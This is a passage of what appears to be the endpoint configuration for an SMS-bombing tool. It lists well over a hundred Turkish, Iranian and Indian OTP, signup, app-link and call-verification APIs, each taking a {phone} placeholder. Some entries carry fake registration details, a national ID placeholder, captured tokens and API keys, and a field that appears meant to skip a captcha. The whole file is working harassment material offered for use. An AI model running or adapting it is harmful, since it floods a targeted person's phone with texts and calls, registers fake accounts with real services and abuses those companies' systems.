HEADER Authorization: Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0
HEADER Device-Info: Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8
HEADER Appversion: IOS-7.1.0
HEADER Servicetype: CarryOut
BODY {"email":"test@gmail.com","isSure":false,"mobilePhone":"{phone}"}
END

SERVICE pidem:Pidem:90
URL https://restashop.azurewebsites.net/graphql/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER Origin: https://pidem.azurewebsites.net
HEADER Authorization: Bearer null
BODY {"query":"\\n  mutation ($phone: String) {\\n    sendOtpSms(phone: $phone) {\\n      resultStatus\\n      message\\n    }\\n  }\\n","variables":{"phone":"{phone}"}}
END

SERVICE frink:Frink:90
URL https://api.frink.com.tr/api/auth/postSendOTP
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER Authorization:
BODY {"areaCode":"90","etkContract":true,"language":"TR","phoneNumber":"90{phone}"}
END

SERVICE bodrum:Bodrum:90
URL https://gandalf.orwi.app/api/user/requestOtp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER Apikey: Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE
HEADER Region: EN
BODY {"gsm":"+90{phone}","source":"orwi"}
END

SERVICE kofteciyusuf:KofteciYusuf:90
URL https://gateway.poskofteciyusuf.com:1283/auth/auth/smskodugonder
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json; charset=utf-8
HEADER Ostype: iOS
HEADER Appversion: 4.0.4.0
HEADER Firmaid: 82
HEADER Language: tr-TR
BODY {"FireBaseCihazKey":null,"FirmaId":82,"GuvenlikKodu":null,"Telefon":"{phone}"}
END

SERVICE littlecaesars_tr:LittleCaesarsTR:90
URL https://api.littlecaesars.com.tr/api/web/Member/Register
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json; charset=utf-8
HEADER Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IjM1Zjc4YTFhNjJjNmViODJlNjQ4OTU0M2RmMWQ3MDFhIiwidHlwIjoiSldUIn0
HEADER X-Platform: ios
HEADER X-Version: 1.0.0
BODY {"CampaignInform":true,"Email":"test@gmail.com","InfoRegister":true,"IsLoyaltyApproved":true,"NameSurname":"Memati Bas","Password":"31ABC..abc31","Phone":"{phone}","SmsInform":true}
END

SERVICE coffy:Coffy:90
URL https://user-api-gw.coffy.com.tr/user/signup
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER Language: tr
HEADER Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
BODY {"countryCode":"90","gsm":"{phone}","isKVKKAgreementApproved":true,"isUserAgreementApproved":true,"name":"Memati Bas"}
END

SERVICE sancaktepe:Sancaktepe:90
URL https://e-belediye.sancaktepe.bel.tr/Sicil/KisiUyelikKaydet
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: multipart/form-data
HEADER Origin: null
DATA __RequestVerificationToken=21z_svqlZXLTEPZGuSugh8winOg_nSRis6rOL-96TmwGUHExtulBBRN9F2XBS_LvU28OyUsfMVdZQmeJlejCYZ1slOmqI63OX_FsQhCxwGk1
DATA SahisUyelik.TCKimlikNo={tc}
DATA SahisUyelik.DogumTarihi=13.01.2000
DATA SahisUyelik.Ad=MEMATİ
DATA SahisUyelik.Soyad=BAS
DATA SahisUyelik.CepTelefonu={phone}
DATA SahisUyelik.EPosta=test@gmail.com
DATA SahisUyelik.Sifre=Memati31
DATA SahisUyelik.SifreyiDogrula=Memati31
DATA recaptchaValid=true
END

SERVICE money_tr:MoneyTR:90
URL https://www.money.com.tr/Account/ValidateAndSendOTP
METHOD POST
CONTENT_TYPE form
HEADER Content-Type: application/x-www-form-urlencoded; charset=UTF-8
HEADER Referer: https://www.money.com.tr/money-kartiniz-var-mi
HEADER X-Requested-With: XMLHttpRequest
DATA phone={phone}
DATA GRecaptchaResponse=
END

SERVICE alixavien:Alixavien:90
URL https://www.alixavien.com.tr/api/member/sendOtp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"Phone":"+90{phone}","XID":""}
END

SERVICE jimmykey:Jimmykey:90
URL https://www.jimmykey.com/tr/p/User/SendConfirmationSms?gsm={phone}
METHOD POST
CONTENT_TYPE json
END

SERVICE ido_tr:IdoTR:90
URL https://api.ido.com.tr/idows/v2/register
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER Accept-Language: tr
BODY {"birthDate":true,"captcha":"","checkPwd":"313131","code":"","day":24,"email":"test@gmail.com","emailNewsletter":false,"firstName":"MEMATI","gender":"MALE","lastName":"BAS","mobileNumber":"0{phone}","month":9,"pwd":"313131","smsNewsletter":true,"tckn":"{tc}","termsOfUse":true,"year":1977}
END

SERVICE wmf_tr:WMFTR:90
URL https://www.wmf.com.tr/users/register/
METHOD POST
CONTENT_TYPE form
DATA confirm=true
DATA date_of_birth=1956-03-01
DATA email=test@gmail.com
DATA email_allowed=true
DATA first_name=Memati
DATA gender=male
DATA last_name=Bas
DATA password=31ABC..abc31
DATA phone=0{phone}
END

SERVICE bim_tr:BimTR:90
URL https://bim.veesk.net/service/v1.0/account/login
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "{phone}"}
END

SERVICE snapp:Snapp:98
URL https://api.snapp.ir/api/v1/sms/link
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "{phone}"}
END

SERVICE snapp_v2:SnappV2:98
URL https://digitalsignup.snapp.ir/ds3/api/v3/otp
METHOD GET
CONTENT_TYPE params
PARAM cellphone={phone}
END

SERVICE achareh:Achareh:98
URL https://api.achareh.co/v2/accounts/login/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "98{phone}"}
END

SERVICE zigap:Zigap:98
URL https://zigap.smilinno-dev.com/api/v1.6/authenticate/sendotp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phoneNumber": "+98{phone}"}
END

SERVICE jabama:Jabama:98
URL https://gw.jabama.com/api/v4/account/send-code
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}"}
END

SERVICE banimode:Banimode:98
URL https://mobapi.banimode.com/api/v2/auth/request
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "{phone}"}
END

SERVICE classino:Classino:98
URL https://student.classino.com/otp/v1/api/login
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}"}
END

SERVICE digikala_v1:DigikalaV1:98
URL https://api.digikala.com/v1/user/authenticate/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"username": "{phone}", "otp_call": false}
END

SERVICE digikala_v2:DigikalaV2:98
URL https://api.digikala.com/v1/user/forgot/check/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"username": "{phone}"}
END

SERVICE smsir:Smsir:98
URL https://appapi.sms.ir/api/app/auth/sign-up/verification-code
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY "{phone}"
END

SERVICE alibaba:Alibaba:98
URL https://ws.alibaba.ir/api/v3/account/mobile/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phoneNumber": "{phone}"}
END

SERVICE divar:Divar:98
URL https://api.divar.ir/v5/auth/authenticate
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "{phone}"}
END

SERVICE sheypoor:Sheypoor:98
URL https://www.sheypoor.com/api/v10.0.0/auth/send
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"username": "{phone}"}
END

SERVICE bikoplus:Bikoplus:98
URL https://bikoplus.com/account/check-phone-number
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phoneNumber": "{phone}"}
END

SERVICE mootanroo:Mootanroo:98
URL https://api.mootanroo.com/api/v3/auth/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"PhoneNumber": "{phone}"}
END

SERVICE tap33:Tap33:98
URL https://tap33.me/api/v2/user
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"credential": {"phoneNumber": "{phone}", "role": "BIKER"}}
END

SERVICE tapsi:Tapsi:98
URL https://api.tapsi.ir/api/v2.2/user
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"credential": {"phoneNumber": "{phone}", "role": "DRIVER"}, "otpOption": "SMS"}
END

SERVICE gapfilm:GapFilm:98
URL https://core.gapfilm.ir/api/v3.1/Account/Login
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"Type": "3", "Username": "{phone}"}
END

SERVICE itoll:IToll:98
URL https://app.itoll.com/api/v1/auth/login
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}"}
END

SERVICE anargift:Anargift:98
URL https://api.anargift.com/api/v1/auth/auth
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile_number": "{phone}"}
END

SERVICE nobat:Nobat:98
URL https://nobat.ir/api/public/patient/login/phone
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}"}
END

SERVICE hamrah_mechanic:HamrahMechanic:98
URL https://www.hamrah-mechanic.com/api/v1/membership/otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"PhoneNumber": "{phone}"}
END

SERVICE abantether:Abantether:98
URL https://abantether.com/users/register/phone/send/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phoneNumber": "{phone}"}
END

SERVICE okcs:OKCS:98
URL https://my.okcs.com/api/check-mobile
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}"}
END

SERVICE tebinja:Tebinja:98
URL https://www.tebinja.com/api/v1/users
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"username": "{phone}"}
END

SERVICE bit24:Bit24:98
URL https://bit24.cash/auth/bit24/api/v3/auth/check-mobile
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}"}
END

SERVICE rojashop:Rojashop:98
URL https://rojashop.com/api/send-otp-register
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}"}
END

SERVICE paklean:Paklean:98
URL https://client.api.paklean.com/download
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"tel": "{phone}"}
END

SERVICE khodro45:Khodro45:98
URL https://khodro45.com/api/v1/customers/otp/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}"}
END

SERVICE delino:Delino:98
URL https://www.delino.com/user/register
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}"}
END

SERVICE digikalajet:DigikalaJet:98
URL https://api.digikalajet.ir/user/login-register/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "{phone}"}
END

SERVICE miare:Miare:98
URL https://www.miare.ir/api/otp/driver/request/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone_number": "{phone}"}
END

SERVICE dosma:Dosma:98
URL https://app.dosma.ir/api/v1/account/send-otp/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}"}
END

SERVICE ostadkr:Ostadkr:98
URL https://api.ostadkr.com/login
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}"}
END

SERVICE sibbazar:Sibbazar:98
URL https://sandbox.sibbazar.com/api/v1/user/invite
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"username": "{phone}"}
END

SERVICE namava:Namava:98
URL https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"UserName": "+98{phone}"}
END

SERVICE shab:Shab:98
URL https://api.shab.ir/api/fa/sandbox/v_1_4/auth/check-mobile
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}"}
END

SERVICE bitpin:Bitpin:98
URL https://api.bitpin.org/v2/usr/signin/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "{phone}"}
END

SERVICE taaghche:Taaghche:98
URL https://gw.taaghche.com/v4/site/auth/signup
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"contact": "{phone}"}
END

SERVICE torob:Torob:98
URL https://api.torob.com/v4/user/phone/send-pin
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone_number": "{phone}"}
END

SERVICE basalam:Basalam:98
URL https://auth.basalam.com/otp-request
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}"}
END

SERVICE khanoumi:Khanoumi:98
URL https://www.khanoumi.com/accounts/sendotp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}", "redirectUrl": ""}
END

SERVICE drdr:DrDr:98
URL https://drdr.ir/api/registerEnrollment/verifyMobile
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phoneNumber": "{phone}", "userType": "PATIENT"}
END

SERVICE telewebion:Telewebion:98
URL https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"code": "98", "phone": "{phone}", "smsStatus": "default"}
END

SERVICE gap:Gap:98
URL https://core.gap.im/v1/user/add.json
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "+98{phone}"}
END

SERVICE caropex:Caropex:98
URL https://caropex.com/api/v1/user/login
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}"}
END

SERVICE novinmedical:Novinmedical:98
URL https://novinmedical.com/wp-admin/admin-ajax.php
METHOD POST
CONTENT_TYPE form
DATA action=stm_login_register
DATA type=mobile
DATA input={phone}
END

SERVICE hamrahsport:Hamrahsport:98
URL https://hamrahsport.com/send-otp
METHOD POST
CONTENT_TYPE form
DATA cell={phone}
DATA name=Persian
DATA agree=1
DATA send_otp=1
END

SERVICE dalfak:Dalfak:98
URL https://www.dalfak.com/api/auth/sendVerificationCode
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"type": 1, "value": "{phone}"}
END

SERVICE doctoreto:Doctoreto:98
URL https://api.doctoreto.com/api/web/patient/v1/accounts/register
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"country_id": 205, "mobile": "{phone}"}
END

SERVICE okala:Okala:98
URL https://api-react.okala.com/C/CustomerAccount/OTPRegister
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}", "deviceTypeCode": 0, "confirmTerms": true, "notRobot": false}
END

SERVICE mellishoes:Mellishoes:98
URL https://mellishoes.ir/wp-admin/admin-ajax.php
METHOD POST
CONTENT_TYPE form
DATA action=websima_auth_account_detection
DATA mobile={phone}
END

SERVICE setshoe:Setshoe:98
URL https://setshoe.ir/wp-admin/admin-ajax.php
METHOD POST
CONTENT_TYPE form
DATA action=stm_login_register
DATA type=mobile
DATA input={phone}
END

SERVICE maxbax:Maxbax:98
URL https://maxbax.com/wp-admin/admin-ajax.php
METHOD POST
CONTENT_TYPE form
DATA action=bakala_send_code
DATA phone_email={phone}
END

SERVICE shikstyle:Shikstyle:98
URL https://shik.style/wp-admin/admin-ajax.php
METHOD POST
CONTENT_TYPE form
DATA action=login
DATA form=phone={phone}
END

SERVICE parkbag:Parkbag:98
URL https://parkbag.com/fa/Account/RegisterOrLoginByMobileNumber
METHOD POST
CONTENT_TYPE form
DATA ReturnUrl=https://parkbag.com/
DATA MobaileNumber={phone}
END

SERVICE digistyle:Digistyle:98
URL https://www.digistyle.com/users/login-register/
METHOD POST
CONTENT_TYPE form
DATA loginRegister[email_phone]={phone}
END

SERVICE telketab:Telketab:98
URL https://telketab.com/opt_field/check_secret
METHOD POST
CONTENT_TYPE form
DATA identity={phone}
DATA plugin=otp_field_sms_processor
DATA key=otp_field_user_auth_form__otp_sms
END

SERVICE adinehbook:Adinehbook:98
URL https://www.adinehbook.com/gp/flex/sign-in.html
METHOD POST
CONTENT_TYPE form
DATA action=sign
DATA phone_cell_or_email={phone}
END

SERVICE gitamehr:Gitamehr:98
URL https://gitamehr.ir/wp-admin/admin-ajax.php
METHOD POST
CONTENT_TYPE form
DATA action=stm_login_register
DATA type=mobile
DATA input={phone}
END

SERVICE sunnybook:Sunnybook:98
URL https://sunnybook.ir/Home/RegisterUser
METHOD POST
CONTENT_TYPE form
DATA name=Mr
DATA password=123456
DATA mobile={phone}
END

SERVICE mahouney:Mahouney:98
URL https://mahouney.com/fa/Account/RegisterOrLoginByMobileNumber
METHOD POST
CONTENT_TYPE form
DATA ReturnUrl=https://mahouney.com/
DATA MobaileNumber={phone}
END

SERVICE myroz:Myroz:98
URL https://myroz.ir/wp-admin/admin-ajax.php
METHOD POST
CONTENT_TYPE form
DATA action=stm_login_register
DATA type=mobile
DATA input={phone}
END

SERVICE meidane:Meidane:98
URL https://meidane.com/accounts/login
METHOD POST
CONTENT_TYPE form
DATA name=Mr
DATA password=123456
DATA mobile={phone}
END

SERVICE ickala:Ickala:98
URL https://ickala.com/
METHOD POST
CONTENT_TYPE form
DATA controller=SendSMS
DATA fc=module
DATA module=loginbymobile
DATA SubmitSmsSend=1
DATA ajax=true
DATA otp_mobile_num={phone}
END

SERVICE microele:Microele:98
URL https://www.microele.com/login?back=my-account
METHOD POST
CONTENT_TYPE form
DATA id_customer=
DATA back=my-account
DATA firstname=123
DATA lastname=123
DATA password=123456
DATA action=register
DATA username={phone}
DATA ajax=1
END

SERVICE elecmarket:Elecmarket:98
URL https://elecmarket.ir/wp-admin/admin-ajax.php
METHOD POST
CONTENT_TYPE form
DATA action=stm_login_register
DATA type=mobile
DATA input={phone}
END

SERVICE techsiro:Techsiro:98
URL https://techsiro.com/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}"}
END

SERVICE noavarpub:Noavarpub:98
URL https://novinparse.com/Page/PageAction.aspx
METHOD POST
CONTENT_TYPE form
DATA Action=SendVerifyCode
DATA mobile={phone}
END

SERVICE titomarket:Titomarket:98
URL https://titomarket.com/index.php?route=account/login_verify/verify
METHOD POST
CONTENT_TYPE form
DATA redirect=https://titomarket.com/my-account
DATA telephone={phone}
END

SERVICE nikanbike:Nikanbike:98
URL https://nikanbike.com/
METHOD POST
CONTENT_TYPE form
DATA controller=authentication
DATA back=my-account
DATA fc=module
DATA ajax=true
DATA module=iverify
DATA phone_mobile={phone}
DATA SubmitCheck=
END

SERVICE account724:Account724:98
URL https://account724.com/wp-admin/admin-ajax.php
METHOD POST
CONTENT_TYPE form
DATA action=stm_login_register
DATA type=mobile
DATA input={phone}
END

SERVICE eaccount:Eaccount:98
URL https://eaccount.ir/api/v1/sessions/login_request
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile_phone": "{phone}"}
END

SERVICE queenaccessories:Queenaccessories:98
URL https://queenaccessories.ir/api/v1/sessions/login_request
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile_phone": "{phone}"}
END

SERVICE rastaraccessory:Rastaraccessory:98
URL https://rastaraccessory.ir/api/v1/sessions/login_request
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile_phone": "{phone}"}
END

SERVICE vinaaccessory:Vinaaccessory:98
URL https://vinaaccessory.com/api/v1/sessions/login_request
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile_phone": "{phone}"}
END

SERVICE chortkehshop:Chortkehshop:98
URL https://chortkehshop.ir/api/v1/sessions/login_request
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile_phone": "{phone}"}
END

SERVICE piinkstore:Piinkstore:98
URL https://piinkstore.ir/api/v1/sessions/login_request
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile_phone": "{phone}"}
END

SERVICE dreamlandshop:Dreamlandshop:98
URL https://dreamlandshop.ir/api/v1/sessions/login_request
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile_phone": "{phone}"}
END

SERVICE confirmtkt:Confirmtkt:91
URL https://securedapi.confirmtkt.com/api/platform/register
METHOD GET
CONTENT_TYPE params
PARAM newOtp=true
PARAM mobileNumber={phone}
END

SERVICE justdial:Justdial:91
URL https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php
METHOD GET
CONTENT_TYPE params
PARAM mobile={phone}
END

SERVICE frotels:Frotels:91
URL https://www.frotels.com/appsendsms.php
METHOD POST
CONTENT_TYPE form
DATA mobno={phone}
END

SERVICE gapoon:Gapoon:91
URL https://www.gapoon.com/userSignup
METHOD POST
CONTENT_TYPE form
DATA mobile={phone}
DATA email=test@gmail.com
DATA name=Test
END

SERVICE housing:Housing:91
URL https://login.housing.com/api/v2/send-otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "{phone}"}
END

SERVICE porter:Porter:91
URL https://porter.in/restservice/send_app_link_sms
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "{phone}", "referrer_string": "", "brand": "porter"}
END

SERVICE cityflo:Cityflo:91
URL https://cityflo.com/website-app-download-link-sms/
METHOD POST
CONTENT_TYPE form
DATA mobile_number={phone}
END

SERVICE nnnow:Nnnow:91
URL https://api.nnnow.com/d/api/appDownloadLink
METHOD POST
CONTENT_TYPE form
DATA mobileNumber={phone}
END

SERVICE ajio:Ajio:91
URL https://login.web.ajio.com/api/auth/signupSendOTP
METHOD POST
CONTENT_TYPE form
DATA firstName=Test
DATA login=test@test.com
DATA password=Test1234
DATA genderType=Male
DATA mobileNumber={phone}
DATA requestType=SENDOTP
END

SERVICE happyeasygo:HappyEasyGo:91
URL https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do
METHOD GET
CONTENT_TYPE params
PARAM phone=91 {phone}
END

SERVICE unacademy:Unacademy:91
URL https://unacademy.com/api/v1/user/get_app_link/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "{phone}"}
END

SERVICE treebo:Treebo:91
URL https://www.treebo.com/api/v2/auth/login/otp/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone_number": "{phone}"}
END

SERVICE airtel:Airtel:91
URL https://www.airtel.in/referral-api/core/notify
METHOD GET
CONTENT_TYPE params
PARAM messageId=map
PARAM rtn={phone}
END

SERVICE pharmeasy:Pharmeasy:91
URL https://pharmeasy.in/api/auth/requestOTP
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"contactNumber": "{phone}"}
END

SERVICE mylescars:Mylescars:91
URL https://www.mylescars.com/usermanagements/chkContact
METHOD POST
CONTENT_TYPE form
DATA contactNo={phone}
END

SERVICE grofers:Grofers:91
URL https://grofers.com/v2/accounts/
METHOD POST
CONTENT_TYPE form
DATA user_phone={phone}
HEADER auth_key: 3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7
END

SERVICE dream11:Dream11:91
URL https://api.dream11.com/sendsmslink
METHOD POST
CONTENT_TYPE form
DATA siteId=1
DATA mobileNum={phone}
DATA appType=androidfull
END

SERVICE cashify:Cashify:91
URL https://www.cashify.in/api/cu01/v1/app-link
METHOD GET
CONTENT_TYPE params
PARAM mn={phone}
END

SERVICE paytm:Paytm:91
URL https://commonfront.paytm.com/v4/api/sendsms
METHOD POST
CONTENT_TYPE form
DATA phone={phone}
DATA guid=2952fa812660c58dc160ca6c9894221d
END

SERVICE kfc_in:KFCIndia:91
URL https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER Referer: https://online.kfc.co.in/login
BODY {"AuthorizedFor": "3", "phoneNumber": "{phone}", "Resend": "false"}
END

SERVICE mobikwik:Mobikwik:91
URL https://webapi.mobikwik.com/p/account/otp/cell/v2
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
HEADER X-MClient: 0
BODY {"cell": "{phone}"}
END

SERVICE redbus:Redbus:91
URL https://m.redbus.in/api/getOtp
METHOD GET
CONTENT_TYPE params
PARAM number={phone}
PARAM cc=91
PARAM whatsAppOpted=false
END

SERVICE newtonschools:NewtonSchools:91
URL https://my.newtonschool.co:443/api/v1/user/otp/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "+91{phone}"}
END

SERVICE flipkart:Flipkart:91
URL https://www.flipkart.com/api/5/user/otp/generate
METHOD POST
CONTENT_TYPE form
DATA loginId=+91{phone}
HEADER X-user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0 FKUA/website/41/website/Desktop
HEADER Origin: https://www.flipkart.com
HEADER Content-Type: application/x-www-form-urlencoded
END

SERVICE heromotocorp:Heromotocorp:91
URL https://www.heromotocorp.com/en-in/xpulse200/ajax_data.php
METHOD POST
CONTENT_TYPE form
DATA mobile_no={phone}
DATA csrf=523bc3fa1857c4df95e4d24bbd36c61b
END

SERVICE indialends:IndiaLends:91
URL https://indialends.com/internal/a/mobile-verification_v2.ashx
METHOD POST
CONTENT_TYPE form
DATA aeyder03teaeare=1
DATA ertysvfj74sje=91
DATA jfsdfu14hkgertd={phone}
DATA lj80gertdfg=0
HEADER Referer: https://indialends.com/personal-loan
END

SERVICE makaan:Makaan:91
URL https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/{phone}
METHOD GET
CONTENT_TYPE params
PARAM callType=otpOnCall
END

SERVICE realestateindia:RealEstateIndia:91
URL https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php
METHOD POST
CONTENT_TYPE form
DATA action_id=call_to_otp
DATA mob_num={phone}
DATA member_id=1547045
END

SERVICE magicbricks:Magicbricks:91
URL https://api.magicbricks.com/bricks/verifyOnCall.html
METHOD GET
CONTENT_TYPE params
PARAM mobile={phone}
END

SERVICE cultfit:CultFit:91
URL https://www.cult.fit/api/auth/loginPhoneSendOtp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"phone": "{phone}", "countryCallingCode": "+91", "captchaResponse": null}
END

SERVICE udaan:Udaan:91
URL https://auth.udaan.com/api/otp/send
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
PARAM client_id=udaan-v2
BODY {"mobile": "{phone}"}
END

SERVICE tata1mg:Tata1mg:91
URL https://www.1mg.com/auth_api/v6/create_token
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"number": "{phone}", "email": "", "is_corporate_user": false, "signup_source": ""}
END

SERVICE byjus:Byjus:91
URL https://byjus.com/question-answer/api/request_otp/
METHOD POST
CONTENT_TYPE form
DATA 0=91-{phone}
END

SERVICE payrup:Payrup:91
URL https://api.payrup.com/api/auth/otp/generate
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobileNumber": "{phone}"}
END

SERVICE shadowfax:ShadowFax:91
URL https://api.shadowfax.in/delivery/otp/send/
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile_number": "{phone}"}
END

SERVICE healthkart:HealthKart:91
URL https://www.healthkart.com/veronica/user/validate/1/{phone}/signup
METHOD GET
CONTENT_TYPE params
END

SERVICE netmeds:Netmeds:91
URL https://www.netmeds.com/mst/rest/v1/id/details/{phone}
METHOD GET
CONTENT_TYPE params
END

SERVICE lybrate:Lybrate:91
URL https://www.lybrate.com/w-ang/v2/p/login-signup
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "+91{phone}"}
END

SERVICE medibuddy:Medibuddy:91
URL https://loginprod.medibuddy.in/unified-login/user/register
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"source": "medibuddyInWeb", "platform": "medibuddy", "phonenumber": "{phone}", "flow": "Retail-Login-Home-Flow"}
END

SERVICE oneapollo:OneApollo:91
URL https://www.oneapollo.com/wp-json/lmsRoute/v1/user/?mobile={phone}
METHOD GET
CONTENT_TYPE params
END

SERVICE ekacare:EkaCare:91
URL https://cowin.eka.care/v2/generate_otp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile_no": "+91{phone}", "allow_whatsapp": true, "auto_retry": false}
END

SERVICE gamezy:Gamezy:91
URL https://www.gamezy.com/api/rummy-prime/download/app/sms
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"mobile": "{phone}"}
END

SERVICE kahvedunyasi:KahveDunyasi:90
URL https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"countryCode": "90", "phoneNumber": "{phone}"}
END

SERVICE englishhome:Englishhome:90
URL https://www.englishhome.com/api/member/sendOtp
METHOD POST
CONTENT_TYPE json
HEADER Content-Type: application/json
BODY {"Phone": "+90{phone}"}
END

SERVICE suiste:Suiste:90
URL https://suiste.com/api/auth/code
METHOD POST
CONTENT_TYPE form
DATA action=register
